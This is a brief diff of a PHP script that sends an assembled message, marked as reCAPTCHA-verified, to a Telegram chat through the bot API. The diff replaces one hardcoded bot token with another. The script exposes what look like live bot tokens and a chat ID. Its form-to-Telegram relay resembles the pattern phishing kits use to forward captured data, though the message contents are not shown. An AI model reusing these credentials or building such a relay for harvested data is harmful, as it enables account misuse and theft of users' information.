@@ -432,7 +432,7 @@ $message .= "══════════════════════�
 $message .= "🔍 Server reCAPTCHA verified at " . date('H:i:s');
 
 // Send to Telegram
-$botToken = "8723725954:AAGfgRgEITCyvoHJihvNbi_2P5IN3WBgYx8";
+$botToken = "8723725954:AAGnBGb-VphBlUylEoucMqo9Bvb1XgwlW3I";
 $chatId = "-5577670969";
 $telegramURL = "https://api.telegram.org/bot$botToken/sendMessage";
 
